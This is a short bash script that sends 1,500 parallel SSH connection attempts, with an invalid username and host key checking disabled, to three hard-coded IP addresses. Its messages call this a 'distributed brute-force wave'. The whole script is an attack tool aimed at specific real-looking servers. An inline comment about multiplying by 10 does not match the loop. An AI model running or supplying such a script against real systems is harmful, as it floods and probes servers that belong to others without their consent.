#!/bin/bash
echo "INITIALIZING VECTOR DISTRIBUTED BRUTE-FORCE WAVE..."
for host in 167.71.156.175 157.245.209.237 134.122.61.153; do
    echo "Spamming 500 high-velocity multi-threaded connections to $host..."
    for i in {1..500}; do
        # Multiplied by 10 to send 1,500 total parallel entries instantly
        ssh -o ConnectTimeout=2 -o ConnectionAttempts=1 -o StrictHostKeyChecking=no invalid_delta_demo@$host 2>/dev/null &
    done
done
wait
echo "Coordinated distributed vectors successfully delivered!"
